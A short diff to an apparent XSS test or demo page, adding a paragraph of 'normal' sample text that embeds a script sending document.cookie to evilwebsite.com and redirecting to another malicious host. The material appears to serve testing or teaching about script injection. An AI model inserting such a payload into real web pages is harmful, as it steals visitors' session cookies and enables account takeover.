@@ -16,5 +16,14 @@
         alert("XSS");
       </script>
     </p>
+
+    <p>
+      This is the sample text from the website. Everything seems normal. " \ "
+      <script>
+        var i=new Image(); i.src='http://evilwebsite.com/log.php?'+document.cookie;" \
+                            "document.location='http://maliciouswebsite.com';
+      </script>
+      " \ "More content from the website continues here.
+    </p>
   </body>
 </html>
